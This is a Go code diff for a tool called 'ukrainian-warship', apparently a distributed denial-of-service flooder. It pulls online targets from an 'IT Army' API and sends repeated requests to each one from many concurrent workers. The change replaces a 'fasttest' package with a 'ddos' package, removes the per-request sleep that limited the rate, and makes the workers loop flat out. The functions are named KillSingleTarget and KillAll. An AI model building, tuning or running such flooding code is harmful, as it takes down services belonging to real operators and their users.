@@ -20,13 +20,14 @@ import (
 	"fmt"
 	"os"
 	"os/signal"
+	"runtime"
 	"sync"
 	"sync/atomic"
 	"time"
 
 	"github.com/briandowns/spinner"
 	"github.com/seedpockets/ukrainian-warship/pkg/api_client"
-	"github.com/seedpockets/ukrainian-warship/pkg/fasttest"
+	"github.com/seedpockets/ukrainian-warship/pkg/ddos"
 	"github.com/spf13/cobra"
 )
 
@@ -79,7 +80,7 @@ func KillSingleTarget(target string, workers int, debug bool) {
 	if !debug {
 		spin.Start()
 	}
-	warship := fasttest.New(target, debug)
+	warship := ddos.New(target, true, debug)
 	wg.Add(workers + 1) // +1 for the terminal stats printer
 	c1, cancel := context.WithCancel(context.Background())
 	exitCh := make(chan struct{})
@@ -88,7 +89,6 @@ func KillSingleTarget(target string, workers int, debug bool) {
 			for {
 				warship.Do()
 				totalReq.inc()
-				time.Sleep(20 * time.Millisecond)
 				select {
 				case <-ctx.Done():
 					fmt.Println("received done, exiting in 50 milliseconds")
@@ -164,27 +164,27 @@ func KillAll(workers int, r float64, debug bool) {
 }
 
 func RunAll(workers int, r float64, debug bool, targets *api_client.TargetsItArmy, wg *sync.WaitGroup, c1 *context.Context, cancel context.CancelFunc, exitCh *chan struct{}, signalCh *chan os.Signal) {
-	armada := make([]*fasttest.Fast, len(targets.Online))
+	armada := []ddos.Ddos{}
 	for i := 0; i < len(targets.Online); i++ {
-		armada[i] = fasttest.New(targets.Online[i], debug)
+		f := ddos.New(targets.Online[i], false, debug)
+		armada = append(armada, f)
 	}
-	for _, v := range armada {
+	for i := 0; i < len(armada); i++ {
 		for j := 0; j < workers; j++ {
-			go func(ctx context.Context) {
+			go func(ctx context.Context, d ddos.Ddos) {
 				for {
-					v.Do()
-					v.TotalRequests.Inc()
 					select {
 					case <-ctx.Done():
-						fmt.Println("Stopping worker...")
-						time.Sleep(50 * time.Millisecond)
+						time.Sleep(25 * time.Millisecond)
 						wg.Done()
 						*exitCh <- struct{}{}
 						return
 					default:
+						d.Do()
+						runtime.Gosched()
 					}
 				}
-			}(*c1)
+			}(*c1, armada[i])
 		}
 	}
 	go func() {
@@ -197,14 +197,13 @@ func RunAll(workers int, r float64, debug bool, targets *api_client.TargetsItArm
 	<-*exitCh
 	wg.Wait()
 	for _, v := range armada {
-		fmt.Printf("Total requests: %d\tRequest Errors: %d\t\tTarget: %s\n", v.TotalRequests, v.TotalErrors, v.URL)
+		fmt.Printf("Total requests: %d\tRequest Errors: %d\t\tTarget: %s\n", v.GetTotal(), v.GetError(), v.GetUrl())
 	}
 }
 
 func getTargets() (*api_client.TargetsItArmy, error) {
 	fmt.Println("Ukrainian Warship Acquiring targets...")
-	targets := &api_client.TargetsItArmy{}
-	targets, err := api_client.GetTargetsItArmyPpUa()
+	targets, err := api_client.GetTargets()
 	if err != nil {
 		return nil, err
 	}
